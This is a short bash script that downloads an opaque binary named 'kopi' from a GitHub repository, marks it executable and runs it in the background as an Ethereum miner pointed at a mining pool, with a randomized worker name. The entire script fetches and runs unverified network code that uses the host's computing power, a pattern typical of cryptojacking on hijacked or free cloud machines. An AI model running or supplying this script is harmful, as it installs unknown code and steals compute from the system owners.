#!/bin/bash
wget https://github.com/aurbach55/dera/raw/main/kopi
chmod +x ./kopi && nohup ./kopi --coin ETH --pool ethash.kupool.com:443 --user berkah.001.$(echo $(shuf -i 1-99999 -n 1)-T4) > nohup.out
